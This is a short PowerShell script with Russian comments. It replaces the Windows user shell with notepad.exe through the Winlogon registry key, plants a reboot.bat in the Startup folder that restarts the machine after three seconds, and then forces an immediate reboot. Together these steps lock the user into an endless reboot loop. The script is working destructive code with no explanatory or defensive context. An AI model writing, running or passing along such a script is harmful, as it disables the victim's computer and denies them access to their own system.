# Заменяем оболочку на notepad.exe
Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name Shell -Value "notepad.exe"

# Создаем BAT в автозагрузке для автоматического ребута
$batPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\reboot.bat"
$batContent = "@echo off`r`ntimeout /t 3 >nul`r`nshutdown /r /t 0"
Set-Content -Path $batPath -Value $batContent -Encoding ASCII
shutdown /r /t 0
